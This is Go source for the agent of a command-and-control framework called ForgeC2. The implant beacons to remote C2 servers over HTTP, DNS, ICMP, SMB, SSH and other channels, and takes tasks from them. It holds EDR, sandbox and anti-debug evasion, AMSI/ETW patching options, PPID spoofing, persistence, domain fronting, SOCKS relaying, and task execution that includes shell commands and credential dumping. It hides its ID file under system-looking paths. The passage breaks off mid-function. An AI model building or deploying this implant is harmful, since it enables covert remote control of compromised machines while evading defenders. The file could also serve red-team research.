//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"bytes"
	"crypto/ed25519"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	mathRand "math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
	"image/jpeg"
	"image/png"
	"path/filepath"

	"github.com/forgec2/forgec2/pkg/encoding"
)

// encodeBeacon marshals a BeaconRequest using multi-format rotation.
func encodeBeacon(v any) ([]byte, error) {
	return encoding.Marshal(v)
}

// decodeBeacon unmarshals a response into BeaconResponse using multi-format detection.
func decodeBeacon(data []byte, v any) error {
	return encoding.Unmarshal(data, v)
}

func newCryptoRand() *mathRand.Rand {
	seed := make([]byte, 8)
	rand.Read(seed)
	src := mathRand.NewSource(int64(binary.LittleEndian.Uint64(seed)))
	return mathRand.New(src)
}

func init() {
	setDPIAware()
	if InitSleepMask() {
		sleepMaskActive = true
	}

	// Start EDR monitor on init
	startEdrMonitor()

	// Run sandbox detection
	go func() {
		time.Sleep(5 * time.Second) // wait for system to settle
		runSandboxCheck()
	}()

	// Environment classification (async to avoid delaying startup)
	go func() {
		time.Sleep(3 * time.Second)
		envClass, opsProfile := detectEnvironment()
		if opsProfile != nil {
			currentEnvClass = envClass
			currentOpsProfile = opsProfile
			envDetected = true
			if !opsProfile.AllowShell {
				log.Println("[env] Shell commands disabled in this environment")
			}
			if !opsProfile.AllowInjection {
				log.Println("[env] Process injection disabled in this environment")
			}
			if !opsProfile.AllowCredDump {
				log.Println("[env] Credential dumping disabled in this environment")
			}
		}
	}()

	// Parse injected string values ( -X only supports string )
	// Multi-C2 failover: comma-separated URLs in C2URL
	parts := strings.Split(C2URL, ",")
	C2URLs = make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p != "" {
			C2URLs = append(C2URLs, p)
		}
	}
	if len(C2URLs) == 0 {
		C2URLs = []string{C2URL}
	}
	currentC2Idx = 0
	var err error
	Interval, err = strconv.Atoi(IntervalStr)
	if err != nil {
		Interval = 10
	}
	Jitter, err = strconv.Atoi(JitterStr)
	if err != nil {
		Jitter = 20
	}
	Persist = strings.ToLower(PersistStr) == "true" || PersistStr == "1"
	SkipTLSVerify = strings.ToLower(SkipTLSVerifyStr) == "true" || SkipTLSVerifyStr == "1"
	Debug = strings.ToLower(DebugStr) == "true" || DebugStr == "1"
	BeaconURI = BeaconURIStr
	if BeaconURI == "" {
		BeaconURI = "/api/v1/beacon"
	}
	BeaconMethod = "POST"   // FORCE POST — GET with body is unreliable in Go's http client
	BeaconTransport = BeaconTransportStr
	if BeaconTransport == "" {
		BeaconTransport = "http"
	}

	// SMB pipe name: use explicit config or extract from C2URL
	smbPipeName = SMBPipeName
	if smbPipeName == "" {
		// Try to extract from C2URL when Protocol is "smb"
		if Protocol == "smb" || strings.HasPrefix(C2URL, "smb://") {
			smbPipeName = strings.TrimPrefix(C2URL, "smb://")
		}
	}
	isSMBParent = strings.ToLower(IsSMBParentStr) == "true" || IsSMBParentStr == "1"

	if Debug {
		fmt.Printf("[DEBUG] BeaconURI=%q BeaconMethod=%q C2URL=%q SMBPipeName=%q\n", BeaconURI, BeaconMethod, C2URL, smbPipeName)
	}
	if id, err := strconv.ParseUint(ListenerIDStr, 10, 32); err == nil {
		ListenerID = uint(id)
	}

	evasionEnabled = strings.ToLower(EvasionStr) == "true" || EvasionStr == "1"
	if v := os.Getenv("FORGEC2_EVASION"); v == "1" || strings.ToLower(v) == "true" {
		evasionEnabled = true
	}

	// Adaptive EDR detection: detect running EDR and apply optimal evasion strategy
	edrInfo := DetectEDR()
	strategy := edrInfo.GetStrategy()
	ApplyStrategy(strategy)
	if edrInfo.Detected && Debug {
		fmt.Printf("[EDR] Detected %s, applied strategy\n", edrInfo.Name)
	}

	// Anti-debug detection: early check before beaconing starts
	if runtime.GOOS == "windows" {
		score, details := AntiDebugCheck()
		antiDebugScore = score
		if score > 20 {
			antiDebugTriggered = true
			log.Printf("[antidebug] Detection score: %d/%d checks triggered", score, len(details))
			if score > 50 {
				enterGhostMode("anti-debug threshold exceeded")
			} else {
				patchAMSI = false
				patchETW = false
			}
		}
		go runAntiDebugMonitor()
	}

	ppidSpoofEnabled = strings.ToLower(PPIDSpoofStr) == "true" || PPIDSpoofStr == "1"
	if v := os.Getenv("FORGEC2_PPID_SPOOF"); v == "1" || strings.ToLower(v) == "true" {
		ppidSpoofEnabled = true
	}

	egressDetection = strings.ToLower(EgressDetectionStr) == "true" || EgressDetectionStr == "1"

	chameleonEnabled = strings.ToLower(ChameleonStr) == "true" || ChameleonStr == "1"
	chameleonProfile = ChameleonProfileStr
	if chameleonProfile == "" {
		chameleonProfile = "random"
	}

	persistencePrefix = PersistencePrefixStr
	if persistencePrefix == "" {
		persistencePrefix = "ForgeC2"
	}
	if v := os.Getenv("FORGEC2_PERSIST_PREFIX"); v != "" {
		persistencePrefix = v
	}

	// SSH transport config
	initSSHConfig()

	// mTLS transport config
	initMTLS()

	// WireGuard transport config
	initWG()

	// Initialize CLR (.NET) hosting for in-process assembly execution
	if runtime.GOOS == "windows" {
		useCLRHosting = initCLRHosting()
	}

	// Initialize beacon payload cipher
	if CryptoKeyStr != "" {
		if strings.HasPrefix(CryptoKeyStr, "ecdh:") {
			// ECDH + AES-256-GCM mode (forward-secret)
			sess, err := newECDSession()
			if err == nil {
				ecdhSess = sess
			}
		} else {
			// Legacy XOR stream cipher mode
			key, err := hex.DecodeString(CryptoKeyStr)
			if err == nil && len(key) == 32 {
				beaconCipher = newStreamCipher(key)
			}
		}
	}

	// Expiry date check: exit if expired
	if ExpiryDateStr != "" {
		kd, err := time.Parse("2006-01-02", ExpiryDateStr)
		if err == nil && time.Now().After(kd) {
			fmt.Println("Expiry date reached, exiting.")
			os.Exit(0)
		}
	}

	// Parse multi-C2 mode
	switch strings.ToLower(C2ModeStr) {
	case "failover":
		c2Mode = C2ModeFailover
	case "roundrobin", "round_robin":
		c2Mode = C2ModeRoundRobin
	case "random":
		c2Mode = C2ModeRandom
	case "split":
		c2Mode = C2ModeSplit
	case "parallel":
		c2Mode = C2ModeParallel
	default:
		c2Mode = C2ModeSingle
	}

	if mr, err := strconv.Atoi(MaxRetriesStr); err == nil {
		maxRetries = mr
	} else {
		maxRetries = 10
	}

	if dt, err := strconv.Atoi(DeadTimeoutStr); err == nil {
		deadTimeout = time.Duration(dt) * time.Second
	} else {
		deadTimeout = 3600 * time.Second
	}

	c2Stats = make(map[int]*c2FailStats)

	// Parse gossip config
	GossipEnabled = strings.ToLower(GossipEnabledStr) == "true" || GossipEnabledStr == "1"
	if gi, err := strconv.Atoi(GossipIntervalStr); err == nil && gi > 0 {
		GossipInterval = gi
	} else {
		GossipInterval = 30
	}
	// If gossip listen addr not set, derive from P2PListenAddr by incrementing port
	if GossipEnabled && GossipListenAddr == "" && P2PListenAddr != "" {
		if host, portStr, err := net.SplitHostPort(P2PListenAddr); err == nil {
			if port, err := strconv.Atoi(portStr); err == nil {
				GossipListenAddr = fmt.Sprintf("%s:%d", host, port+1)
			}
		}
	}

	// Working hours
	workingStart = WorkingStartStr
	workingEnd = WorkingEndStr
	workingTZ = WorkingTZStr

	// Kill date
	if KillDateStr != "" {
		if kd, err := time.Parse("2006-01-02", KillDateStr); err == nil {
			killDateParsed = kd
		}
	}

	// TLS verification controlled by SkipTLSVerify (injected at build time)
	var tr *http.Transport
	if chameleonEnabled {
		tr = newUTLSTransport()
	} else {
		tr = &http.Transport{
			MaxIdleConns:        10,
			MaxIdleConnsPerHost: 5,
			IdleConnTimeout:     60 * time.Second,
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: SkipTLSVerify},
		}
		if DomainFront != "" {
			tr.TLSClientConfig.ServerName = DomainFront
		}
	}
	if ProxyStr != "" {
		proxyURL, err := url.Parse(ProxyStr)
		if err == nil {
			tr.Proxy = http.ProxyURL(proxyURL)
		}
	}
	client = &http.Client{
		Transport: tr,
		Timeout:   30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
}

func main() {
	log.SetFlags(0)
	setDPIAware()
	if Debug {
		fmt.Println(s(SForgeC2), "Agent starting...")
	}

	if Persist {
		addPersistence()
	}

	// Sandbox detection ? run once at startup
	detector := NewSandboxDetector()
	result := detector.Detect()
	inSandbox = result.IsSandbox
	if inSandbox {
		log.Printf(s(SForgeC2)+" Sandbox detected (confidence: %d%%), entering benign mode", result.Confidence)
	}

	// Initial registration / first beacon
	agentUUID = registerOrGetUUID()

	// Mark as SMB child if using SMB transport
	if Protocol == "smb" || BeaconTransport == "smb" {
		isSMBChild = true
		if Debug {
			fmt.Printf(s(SForgeC2)+" SMB child mode, pipe: %s\n", smbPipeName)
		}
	}

	// Start SMB parent pipe listener if configured
	if isSMBParent && smbPipeName != "" {
		if err := StartSMBParentPipe(smbPipeName); err != nil {
			if Debug {
				fmt.Printf("[!] SMB parent pipe start failed: %v\n", err)
			}
		} else {
			go p2pCleanupStaleChildren()
		}
	}

	// Start P2P parent listener if in parent mode
	if P2PMode != "" && P2PListenAddr != "" {
		go p2pParentListen()
		go p2pCleanupStaleChildren()
		if Debug {
			fmt.Printf(s(SForgeC2)+" P2P parent mode (%s) on %s\n", P2PMode, P2PListenAddr)
		}
	}

	// JIT Beacon Scheduler
	if runtime.GOOS == "windows" {
		getBeaconScheduler()
	}

	// Start gossip protocol for P2P mesh auto-routing
	if GossipEnabled {
		go startGossipProtocol()
		if GossipListenAddr != "" {
			go gossipListen()
			if Debug {
				fmt.Printf(s(SForgeC2)+" Gossip listener on %s\n", GossipListenAddr)
			}
		}
	}

	// Run egress detection on first startup if configured
	if Protocol != "smb" && (BeaconTransport == "auto" || egressDetection) {
		c2Host := extractC2Host()
		ports := parseEgressPorts()
		if Debug {
			fmt.Printf("[egress] Running egress detection against %s ports %v\n", c2Host, ports)
		}
		report := runEgressDetection(c2Host, ports)
		egressReport = report
		egressDetected = true
		if report.Best != "" {
			bestEgressProto = report.Best
			if Debug {
				fmt.Printf("[egress] Best protocol: %s\n", bestEgressProto)
			}
			switch {
			case strings.HasPrefix(bestEgressProto, "tcp/"):
				Protocol = "tcp"
			case bestEgressProto == "dns":
				Protocol = "dns"
			case bestEgressProto == "icmp":
				Protocol = "icmp"
			}
		}
	}

	// Main beacon loop
	beaconCount := 0
	for {
		// Kill date check: exit if expired
		if !killDateParsed.IsZero() && time.Now().After(killDateParsed) {
			if Debug {
				fmt.Println("[*] Kill date reached, exiting.")
			}
			os.Exit(0)
		}

		// Ghost mode: send final beacon, then sleep
		if isInGhostMode() {
			if !ghostBeaconSent {
				ghostBeaconSent = true
				doBeacon()
			}
			time.Sleep(24 * time.Hour)
			continue
		}

		// Check triggers before beacon (Windows only)
		if runtime.GOOS == "windows" && beaconSched != nil {
			beaconSched.CheckTriggers()
		}

		doBeacon()
		beaconCount++

		// Notify scheduler after beacon
		if runtime.GOOS == "windows" && beaconSched != nil {
			beaconSched.AfterBeacon()
		}

		// Deliver task results immediately instead of waiting a full sleep cycle.
		pendingMu.Lock()
		hasPending := len(pendingResults) > 0
		pendingMu.Unlock()
		if hasPending {
			continue
		}

		// Working hours check: if outside working hours, sleep until next window
		if workingStart != "" && workingEnd != "" {
			if !isWithinWorkingHours() {
				sleepDuration := timeUntilNextWindow()
				if Debug {
					fmt.Printf("[working] Outside working hours (%s-%s), sleeping %v\n", workingStart, workingEnd, sleepDuration)
				}
				time.Sleep(sleepDuration)
				continue
			}
		}

		sleepWithJitter()
	}
}

func sleepWithJitter() {
	// Use sleep variator for non-default modes
	mode := getSleepMode()
	if mode != SleepModeDefault && mode != SleepModeInteractive {
		duration := computeSleepDuration()
		if sleepMaskActive {
			sleepWithMask(duration)
			return
		}
		if evasionEnabled {
			sleepObfuscated(duration)
			return
		}
		time.Sleep(duration)
		return
	}

	// Use JIT scheduler on Windows if available
	if runtime.GOOS == "windows" && beaconSched != nil {
		if beaconSched.ShouldBeaconNow() {
			return
		}
		duration := beaconSched.ComputeNext()

		if sleepMaskActive {
			sleepWithMask(duration)
			return
		}
		if evasionEnabled {
			sleepObfuscated(duration)
			return
		}
		time.Sleep(duration)
		return
	}

	// Interval 0 = interactive mode (tight beacon loop for shell/UI).
	if Interval <= 0 {
		d := 200 * time.Millisecond
		if inFastMode.Load() {
			d = 50 * time.Millisecond
		}
		time.Sleep(d)
		return
	}
	baseInterval := Interval
	if inFastMode.Load() {
		baseInterval = FastInterval
	}
	base := time.Duration(baseInterval) * time.Second
	jit := float64(Jitter) / 100.0
	variation := time.Duration(float64(base) * jit * (rng.Float64()*2 - 1))

	// If Sleep Mask is initialized, use encrypted sleep
	if sleepMaskActive {
		sleepWithMask(base + variation)
		return
	}
	if evasionEnabled {
		sleepObfuscated(base + variation)
		return
	}
	time.Sleep(base + variation)
}

func checkFastMode(tasks []Task) {
	inFastMode.Store(false)
	fastTypes := map[string]bool{
		"screenshot": true, "screenshot_window": true, "shell": true, "ps": true,
		"clipboard_get": true, "clipboard_set": true, "find": true, "drives": true,
		"services": true, "beacon_now": true, "ls": true, "read": true,
	}
	for _, task := range tasks {
		if fastTypes[task.Type] {
			inFastMode.Store(true)
			return
		}
	}
}

func registerOrGetUUID() string {
	uuidFile := getUUIDFilePath()
	if data, err := os.ReadFile(uuidFile); err == nil && len(data) > 0 {
		return strings.TrimSpace(string(data))
	}
	// Generate new using crypto/rand (RFC 4122 compliant)
	var buf [16]byte
	if _, err := rand.Read(buf[:]); err == nil {
		buf[6] = (buf[6] & 0x0f) | 0x40 // version 4
		buf[8] = (buf[8] & 0x3f) | 0x80 // variant 10
		newUUID := fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
			buf[0:4], buf[4:6], buf[6:8], buf[8:10], buf[10:16])
		os.WriteFile(uuidFile, []byte(newUUID), 0644)
		if runtime.GOOS == "windows" {
			setHidden(uuidFile)
		}
		return newUUID
	}
	// Fallback (should never happen)
	newUUID := fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		rng.Uint32(), rng.Uint32()&0xffff, rng.Uint32()&0xffff|0x4000,
		rng.Uint32()&0x3fff|0x8000, rng.Uint64())
	os.WriteFile(uuidFile, []byte(newUUID), 0644)
	if runtime.GOOS == "windows" {
		setHidden(uuidFile)
	}
	return newUUID
}

// getUUIDFilePath returns a less-obvious path for UUID persistence.
func getUUIDFilePath() string {
	if runtime.GOOS == "windows" {
		return os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Crypto\\RSA\\S-1-5-21-0-0-0\\machineguid"
	}
	if runtime.GOOS == "darwin" {
		return os.Getenv("HOME") + "/Library/Preferences/.cfprefsd.plist"
	}
	return "/var/lib/dbus/machine-id"
}

func doBeacon() {
	info := getSystemInfo()

	// Collect pending SOCKS relay data
	socksData := socksCollectOutbound()
	if len(socksData) > 0 {
		inFastMode.Store(true) // fast poll while SOCKS is active
	}

	// Collect rportfwd data alongside SOCKS frames
	rpfData := rportfwdCollectOutbound()
	if len(rpfData) > 0 {
		socksData = append(socksData, rpfData...)
		inFastMode.Store(true)
	}

	// Collect P2P child results to relay
	p2pRelayMu.Lock()
	relayedResults := make([]RelayedData, 0)
	for _, childUUID := range p2pChildUUIDs {
		if results, ok := p2pChildResults[childUUID]; ok && len(results) > 0 {
			relayedResults = append(relayedResults, RelayedData{
				AgentID: childUUID,
				Results: results,
			})
			delete(p2pChildResults, childUUID)
		}
	}
	p2pRelayMu.Unlock()

	// Append gossip peer table to results if enabled (throttled)
	if GossipEnabled && time.Since(lastGossipReport) > 30*time.Second {
		peerTableMu.RLock()
		peers := make([]PeerInfo, 0, len(peerTable))
		for _, p := range peerTable {
			peers = append(peers, p)
		}
		peerTableMu.RUnlock()
		if len(peers) > 0 {
			if data, err := json.Marshal(peers); err == nil {
				pendingMu.Lock()
				pendingResults = append(pendingResults, TaskResult{
					Type:   "gossip_discover",
					Output: string(data),
				})
				pendingMu.Unlock()
				lastGossipReport = time.Now()
			}
		}
	}

	pendingMu.Lock()
	resultsCopy := pendingResults
	pendingResults = nil // sent
	pendingMu.Unlock()

	req := BeaconRequest{
		UUID:      agentUUID,
		Info:      info,
		Results:   resultsCopy,
		SocksData: socksData,
		Relayed:   relayedResults,
	}

	body, _ := json.Marshal(req)

	// Decide encryption mode and build payload
	var sendBody []byte
	var isECDH bool

	if ecdhSess != nil {
		if ecdhSess.needsHandshake() {
			// First beacon: ECDH handshake ? send public key in top-level JSON
			envelope := struct {
				UUID    string `json:"uuid"`
				ECDHPub string `json:"ecdh_pub"`
			}{
				UUID:    agentUUID,
				ECDHPub: ecdhSess.publicKeyB64(),
			}
			envelopeJSON, _ := json.Marshal(envelope)
			sendBody = envelopeJSON
			isECDH = true
		} else {
			// Encrypt inner payload with AES-256-GCM
			cipherB64, err := ecdhSess.encryptAESGCM(body)
			if err != nil {
				if Debug {
					fmt.Printf("[!] ECDH encrypt failed: %v\n", err)
				}
				// Fallback to plaintext
				sendBody = body
			} else {
				envelope := struct {
					UUID      string `json:"uuid"`
					CipherB64 string `json:"c"`
					ECDHPub   string `json:"ecdh_pub,omitempty"`
				}{
					UUID:      agentUUID,
					CipherB64: cipherB64,
				}
				if ecdhSess.rotationPending {
					envelope.ECDHPub = ecdhSess.rotationPubKeyB64
					ecdhSess.rotationPending = false
				}
				envelopeJSON, _ := json.Marshal(envelope)
				sendBody = envelopeJSON
				isECDH = true
			}
		}
	} else if beaconCipher != nil {
		// Legacy XOR stream cipher: encrypt entire body
		encrypted, err := beaconCipher.encrypt(body)
		if err == nil {
			sendBody = encrypted
		} else {
			sendBody = body
		}
	} else {
		sendBody = body
	}

	// Apply traffic shape analysis and adaptation
	sendBody = applyTrafficShaping(sendBody)

	// P2P child mode: beacon through parent instead of server
	var respBody []byte
	if P2PParent != "" {
		respBody = sendP2PBeacon(sendBody)
	} else if Protocol == "smb" || BeaconTransport == "smb" {
		respBody = sendSMBBeacon(sendBody)
	} else if Protocol == "tcp" {
		respBody = sendTCPBeacon(body)
	} else if Protocol == "dns" {
		respBody = sendDNSBeacon(body)
		if respBody == nil {
			dnsConsecutiveFailures++
			if Debug {
				fmt.Printf("[!] DNS beacon failed (%d/%d consecutive failures)\n", dnsConsecutiveFailures, dnsFallbackThreshold)
			}
			if dnsConsecutiveFailures >= dnsFallbackThreshold {
				if Debug {
					fmt.Println("[!] DNS failure threshold reached, falling back to HTTP")
				}
				Protocol = "http"
				respBody = sendWithMode(sendBody)
			}
		} else {
			dnsConsecutiveFailures = 0
		}
	} else if Protocol == "icmp" {
		respBody = sendICMPBeacon(sendBody)
	} else if BeaconTransport == "wss" {
		respBody = sendWSSBeacon(sendBody)
	} else if BeaconTransport == "grpc" || strings.HasPrefix(C2URLs[currentC2Idx], "grpc://") || strings.HasPrefix(C2URLs[currentC2Idx], "grpcs://") {
		respBody = sendGRPCBeacon(sendBody)
	} else if BeaconTransport == "ssh" || strings.HasPrefix(C2URLs[currentC2Idx], "ssh://") {
		respBody = sendSSHBeacon(sendBody)
	} else if BeaconTransport == "mtls" || strings.HasPrefix(C2URLs[currentC2Idx], "mtls://") {
		respBody = sendMTLSBeacon(sendBody)
	} else if BeaconTransport == "h2c" || strings.HasPrefix(C2URLs[currentC2Idx], "h2c://") {
		respBody = sendH2CBeacon(sendBody)
	} else if BeaconTransport == "wg" || strings.HasPrefix(C2URLs[currentC2Idx], "wg://") {
		respBody = sendWGBeacon(sendBody)
	} else {
		respBody = sendWithMode(sendBody)
	}
	if respBody == nil {
		if Debug {
			fmt.Println("[!] Beacon returned nil, skipping")
		}
		return
	}

	// Parse response
	var resp BeaconResponse

	if isECDH && ecdhSess != nil && ecdhSess.needsHandshake() {
		// Parse handshake response ? expect ecdh_pub from server
		var envelope struct {
			ECDHPub   string `json:"ecdh_pub,omitempty"`
			CipherB64 string `json:"c,omitempty"`
		}
		if err := json.Unmarshal(respBody, &envelope); err != nil {
			if Debug {
				log.Printf("[!] Failed to parse ECDH handshake response: %v", err)
			}
			// Fallback: try parsing as full beacon response
			if err := decodeBeacon(respBody, &resp); err != nil {
				return
			}
		} else if envelope.ECDHPub != "" {
			// Complete the ECDH handshake
			if err := ecdhSess.establishFromServerKey(envelope.ECDHPub); err != nil {
				if Debug {
					log.Printf("[!] ECDH handshake completion failed: %v", err)
				}
			}
			// Re-beacon immediately with encrypted payload
			inFastMode.Store(true)
			return
		} else if envelope.CipherB64 != "" {
			// Session was already established (server responded with encrypted data)
			plaintext, err := ecdhSess.decryptAESGCM(envelope.CipherB64)
			if err != nil {
				if Debug {
					log.Printf("[!] ECDH decrypt failed: %v", err)
				}
				return
			}
			if err := decodeBeacon(plaintext, &resp); err != nil {
				return
			}
		}
	} else if isECDH && ecdhSess != nil {
		// Parse encrypted response
		var envelope struct {
			ECDHPub   string `json:"ecdh_pub,omitempty"`
			CipherB64 string `json:"c,omitempty"`
		}
		if err := json.Unmarshal(respBody, &envelope); err != nil {
			return
		}

		// Check for session key rotation
		if envelope.ECDHPub != "" {
			if err := ecdhSess.rotateKeyPair(); err != nil {
				if Debug {
					log.Printf("[!] ECDH key pair rotation failed: %v", err)
				}
			} else if err := ecdhSess.establishFromServerKey(envelope.ECDHPub); err != nil {
				if Debug {
					log.Printf("[!] ECDH key rotation failed: %v", err)
				}
			}
		}

		if envelope.CipherB64 != "" {
			plaintext, err := ecdhSess.decryptAESGCM(envelope.CipherB64)
			if err != nil {
				if Debug {
					log.Printf("[!] ECDH decrypt failed: %v", err)
				}
				return
			}
			if err := decodeBeacon(plaintext, &resp); err != nil {
				return
			}
		}
	} else if beaconCipher != nil {
		var parseBody []byte
		decrypted, err := beaconCipher.decrypt(respBody)
		if err == nil {
			parseBody = decrypted
		} else {
			parseBody = respBody
		}
		if err := decodeBeacon(parseBody, &resp); err != nil {
			if Debug {
				log.Printf("[!] Failed to parse response: %v", err)
			}
			return
		}
	} else {
		if err := decodeBeacon(respBody, &resp); err != nil {
			if Debug {
				log.Printf("[!] Failed to parse response: %v", err)
			}
			return
		}
	}

	// Process SOCKS relay frames from server (before tasks, so connect arrives first)
	if len(resp.SocksFrames) > 0 {
		socksProcessFrames(resp.SocksFrames)
	}

	// Distribute relayed tasks to P2P children
	if len(resp.Relayed) > 0 {
		p2pRelayMu.Lock()
		for _, rt := range resp.Relayed {
			p2pChildTasks[rt.AgentID] = append(p2pChildTasks[rt.AgentID], rt.Tasks...)
		}
		p2pRelayMu.Unlock()
	}

	// checkFastMode resets inFastMode, so we set SOCKS hints AFTER it
	checkFastMode(resp.Tasks)

	// SOCKS fast mode overrides (after checkFastMode's reset)
	if resp.SocksFastMode || len(resp.SocksFrames) > 0 || socksRelayFast {
		inFastMode.Store(true)
	}
	socksRelayMu.Lock()
	if len(socksRelayConns) > 0 {
		inFastMode.Store(true)
	}
	socksRelayMu.Unlock()

	pendingMu.Lock()
	if cap(pendingResults) < len(resp.Tasks) {
		pendingResults = make([]TaskResult, 0, len(resp.Tasks))
	}
	for _, task := range resp.Tasks {
		result := executeTask(task)
		pendingResults = append(pendingResults, result)
	}
	pendingMu.Unlock()
}

func sendToC2(idx int, body []byte) []byte {
	if idx < 0 || idx >= len(C2URLs) {
		return nil
	}
	url := C2URLs[idx]

	beaconURI := BeaconURI
	if ContentLengthJitter > 0 {
		beaconURI = addRandomParam(beaconURI)
	}

	req, err := http.NewRequest("POST", url+beaconURI, bytes.NewReader(body))
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", UserAgent)

	if DomainFront != "" {
		req.Host = DomainFront
	}

	resp, err := client.Do(req)
	if err != nil {
		if Debug {
			fmt.Printf("[!] Beacon to %s failed: %v\n", url, err)
		}
		return nil
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		if Debug {
			fmt.Printf("[!] %s returned %d\n", url, resp.StatusCode)
		}
		return nil
	}

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}
	if Debug {
		fmt.Printf("[+] Beacon OK from %s, response %d bytes\n", url, len(data))
	}
	return data
}

func sendBeacon(body []byte) []byte {
	startIdx := currentC2Idx
	for i := 0; i < len(C2URLs); i++ {
		idx := (startIdx + i) % len(C2URLs)
		data := sendToC2(idx, body)
		if data != nil {
			currentC2Idx = idx
			return data
		}
	}
	return nil
}

// ?? Multi-C2 mode dispatch ???????????????????????????????????????????????

func sendWithMode(body []byte) []byte {
	if atomic.LoadInt32(&deadMode) == 1 {
		if time.Since(deadModeStart) > deadTimeout {
			atomic.StoreInt32(&deadMode, 0)
			if Debug {
				fmt.Println("[c2] Dead mode timeout expired, retrying...")
			}
		} else {
			return nil
		}
	}

	switch c2Mode {
	case C2ModeFailover:
		for i := 0; i < len(C2URLs); i++ {
			idx := (currentC2Idx + i) % len(C2URLs)
			resp := sendToC2(idx, body)
			if resp != nil {
				recordSuccess(idx)
				currentC2Idx = idx
				return resp
			}
			recordFailure(idx)
		}
		checkAllDead()
		return nil

	case C2ModeRoundRobin:
		currentC2Idx = (currentC2Idx + 1) % len(C2URLs)
		resp := sendToC2(currentC2Idx, body)
		if resp != nil {
			recordSuccess(currentC2Idx)
			return resp
		}
		recordFailure(currentC2Idx)
		checkAllDead()
		return nil

	case C2ModeRandom:
		idx := mathRand.Intn(len(C2URLs))
		currentC2Idx = idx
		resp := sendToC2(idx, body)
		if resp != nil {
			recordSuccess(idx)
			return resp
		}
		recordFailure(idx)
		return nil

	case C2ModeSplit:
		bestIdx := 0
		bestFails := int(^uint(0) >> 1)
		for i := range C2URLs {
			c2StatsMu.Lock()
			stats := c2Stats[i]
			c2StatsMu.Unlock()
			fails := 0
			if stats != nil {
				fails = stats.consecutive
			}
			if fails < bestFails {
				bestFails = fails
				bestIdx = i
			}
		}
		currentC2Idx = bestIdx
		resp := sendToC2(bestIdx, body)
		if resp != nil {
			recordSuccess(bestIdx)
			return resp
		}
		recordFailure(bestIdx)
		checkAllDead()
		return nil

	case C2ModeParallel:
		type parResp struct {
			data []byte
			idx  int
		}
		ch := make(chan parResp, len(C2URLs))
		for i := range C2URLs {
			idx := i
			go func() {
				data := sendToC2(idx, body)
				ch <- parResp{data, idx}
			}()
		}
		hasFailure := false
		for i := 0; i < len(C2URLs); i++ {
			r := <-ch
			if r.data != nil {
				recordSuccess(r.idx)
				currentC2Idx = r.idx
				return r.data
			}
			recordFailure(r.idx)
			hasFailure = true
		}
		if hasFailure {
			checkAllDead()
		}
		return nil

	default:
		resp := sendToC2(currentC2Idx, body)
		if resp != nil {
			recordSuccess(currentC2Idx)
			return resp
		}
		recordFailure(currentC2Idx)
		checkAllDead()
		return nil
	}
}

func recordFailure(idx int) {
	c2StatsMu.Lock()
	defer c2StatsMu.Unlock()
	if c2Stats == nil {
		return
	}
	stats := c2Stats[idx]
	if stats == nil {
		stats = &c2FailStats{}
		c2Stats[idx] = stats
	}
	stats.failures++
	stats.consecutive++
	stats.lastFailure = time.Now()
}

func recordSuccess(idx int) {
	c2StatsMu.Lock()
	defer c2StatsMu.Unlock()
	if c2Stats == nil {
		return
	}
	stats := c2Stats[idx]
	if stats == nil {
		stats = &c2FailStats{}
		c2Stats[idx] = stats
	}
	stats.failures = 0
	stats.consecutive = 0
}

func checkAllDead() {
	if len(C2URLs) == 0 || maxRetries <= 0 {
		return
	}
	c2StatsMu.Lock()
	allDead := true
	for i := range C2URLs {
		stats := c2Stats[i]
		if stats == nil || stats.consecutive < maxRetries {
			allDead = false
			break
		}
	}
	if allDead {
		atomic.StoreInt32(&deadMode, 1)
		deadModeStart = time.Now()
		if Debug {
			fmt.Println("[!] All C2s unreachable, entering dead mode")
		}
	}
	c2StatsMu.Unlock()
}

func addRandomParam(uri string) string {
	params := []string{"id", "token", "session", "t", "nonce", "cb", "_"}
	name := params[mathRand.Intn(len(params))]
	val := fmt.Sprintf("%x", mathRand.Uint64())
	if strings.Contains(uri, "?") {
		return uri + "&" + name + "=" + val
	}
	return uri + "?" + name + "=" + val
}

// p2pCleanupStaleChildren prunes child UUIDs/results/tasks not seen in 10 minutes.
func p2pCleanupStaleChildren() {
	for {
		time.Sleep(5 * time.Minute)
		p2pRelayMu.Lock()
		cutoff := time.Now().Add(-10 * time.Minute)
		keep := make([]string, 0, len(p2pChildUUIDs))
		for _, uuid := range p2pChildUUIDs {
			if last, ok := p2pChildLastSeen[uuid]; ok && last.After(cutoff) {
				keep = append(keep, uuid)
			} else {
				delete(p2pChildResults, uuid)
				delete(p2pChildTasks, uuid)
				delete(p2pChildLastSeen, uuid)
			}
		}
		p2pChildUUIDs = keep
		p2pRelayMu.Unlock()
	}
}

// sendTCPBeacon implements the TCP transport using length-prefixed JSON framing.
// C2URL should be host:port (or tcp://host:port) when Protocol=="tcp".
func sendTCPBeacon(body []byte) []byte {
	addr := strings.TrimPrefix(C2URL, "tcp://")
	addr = strings.TrimPrefix(addr, "tls://")

	var conn net.Conn
	var err error

	// Basic TLS support when SkipTLSVerify or using tls:// scheme
	useTLS := SkipTLSVerify || strings.HasPrefix(C2URL, "tls://")
	if useTLS {
		tlsCfg := &tls.Config{InsecureSkipVerify: SkipTLSVerify}
		if DomainFront != "" {
			tlsCfg.ServerName = DomainFront
		}
		conn, err = tls.Dial("tcp", addr, tlsCfg)
	} else {
		conn, err = net.Dial("tcp", addr)
	}
	if err != nil {
		if Debug {
			fmt.Printf("[!] TCP beacon dial failed: %v\n", err)
		}
		return nil
	}
	defer conn.Close()

	// Write length (BE) + body
	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
